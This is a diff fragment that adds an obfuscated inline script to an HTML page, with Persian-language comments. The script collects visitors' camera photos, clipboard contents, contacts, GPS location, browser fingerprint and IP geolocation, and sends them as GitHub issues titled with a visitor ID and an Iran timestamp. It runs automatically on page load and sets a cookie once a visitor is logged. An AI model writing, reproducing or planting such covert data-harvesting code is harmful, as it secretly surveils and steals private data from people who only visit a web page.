+    const ipLocationsJson = JSON.stringify(ipLocations, null, 2);
+
+    let extraSection = '';
+    if (cameraData?.photo) extraSection += `\n## عکس دوربین\n\n![camera](${cameraData.photo})\n`;
+    if (clipboardData?.text) extraSection += `\n## کلیپ‌بورد\n\n\`\`\`\n${clipboardData.text.replace(/`/g, '\\`')}\n\`\`\`\n`;
+    if (contactsData?.contacts?.length) extraSection += `\n## مخاطبین\n\n\`\`\`json\n${JSON.stringify(contactsData.contacts, null, 2)}\n\`\`\`\n`;
+    if (geoData?.coords) extraSection += `\n## موقعیت GPS\n\n| عرض | ${geoData.coords.latitude} |\n| طول | ${geoData.coords.longitude} |\n| دقت | ${geoData.coords.accuracy} متر |\n`;
+
+    const iranDateTime = getIranDateTime();
+    const issueTitle = `Visitor ${visitorId} ${iranDateTime}`;
+
+    const bodyParts = [
+      `# Visitor ${visitorId}`,
+      `## زمان: ${iranDateTime}`,
+      `## اثر انگشت کامل + IP عمومی/محلی`,
+      "```json",
+      JSON.stringify(fingerprintData, null, 2),
+      "```",
+      ipLocationsJson ? `## موقعیت جغرافیایی و جزئیات IP ها (JSON)\n\`\`\`json\n${ipLocationsJson}\n\`\`\`` : '',
+      extraSection
+    ].filter(Boolean).join("\n");
+
+    const success = await _0xGitHubRegister(issueTitle, bodyParts);
+    const elapsed = ((performance.now() - startTime) / 1000).toFixed(2);
+    if (success) {
+      _0xSc(_0xCk, "1", _0xMx);
+      console.log(`[${iranDateTime}] ثبت موفقیت‌آمیز در ${elapsed} ثانیه`);
+      // Report failures
+      const failedTasks = [];
+      taskResults.forEach((r, idx) => {
+        if (r.status !== 'fulfilled' || r.value === null) {
+          failedTasks.push(idx);
+        }
+      });
+      if (failedTasks.length > 0) {
+        console.warn(`[${iranDateTime}] این موارد ناموفق بودند: ${failedTasks.join(', ')}`);
+      } else {
+        console.log(`[${iranDateTime}] همه اطلاعات با موفقیت جمع‌آوری شد.`);
+      }
+    } else {
+      console.error(`[${iranDateTime}] ثبت ناموفق بود.`);
+    }
+  };
+
+  _0xInit().catch((e) => {
+    console.error('[Init Error]', e);
+  });
+})();
+    </script>
 </body>
   </html>
